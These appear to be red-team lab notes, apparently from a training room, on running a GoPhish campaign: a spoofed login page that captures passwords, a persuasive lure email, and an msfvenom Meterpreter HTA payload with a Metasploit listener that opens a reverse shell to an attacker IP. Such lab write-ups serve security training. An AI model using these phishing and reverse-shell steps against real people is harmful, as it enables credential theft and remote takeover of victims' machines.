Setting up GoPhish, sending a phishing campaign and capturing user credentials from a spoof website.

#### Sending Profiles
Sending profiles are the connection details required to actually send your Phishing emails; this is just an SMTP server that you have access to.
- **Name:** Local Server
- **From:** noreply@redteam.thm
- **Host:** 127.0.0.1:25
Then click **Save Profile**.

#### Landing Pages
This is the website that the Phishing email is going to direct the victim to; this page is usually a spoof of a website the victim is familiar with.
- **Name:** ACME Login
- **In HTML Box:** Press `Source` to allow us to enter the HTML code. 
- `Click the Source button again.`
- `Click the Capture Submitted Data box.`
- `Click the Capture Passwords box.`
- `Save Page Button`

#### Email Templates
This is the ***design and content of the email*** you're going to actually send to the victim; it will need to be ***persuasive and contain a link to your landing page*** to enable us to capture the victim's username and password. 
- `Name:` name the email
- `Subject:` subject the email
- `HTML:` choose **HTML** and **Source** to enable HTML editor mode. Write a **persuasive email** and ***add the link*** for the victim to click.
- `{{.URL}}:` click ***Link***, actual link will need to be set to this which will get changed to out spoofed landing page when the email gets sent.
- `other:` set the protocol to ***other***.
- `Save the Template`

#### Users & Groups
This is where we can store the email addresses of our ***intended targets***.
- `Name:` Targets
- `email:` add target emails
- `save`

#### Campaigns
Time to send your first emails.
- `Name:` Campaign One
- `Email Template:` Email 1

--- 
### Reverse Shell with GoPhish
#### Create a Payload with Msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=443 -f hta-psh -o payload.hta
```

#### Create a new listener in Metasploit
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost KALI_IP
run
```

#### Visit the GoPhish Website
```
https://localhost:3333
```

#### Sending Profile
As above

#### Landing Pages
As above, however; content can be anything.

#### Email Template
- Add the Msfvenom-created `.hta` file as an attachment.

#### Users & Groups
As above, with the position 1.

#### Campaigns
- Set the URL to `http://<Kali IP>:443`

Now, wait for the victim to open the payload which will give a shell back.




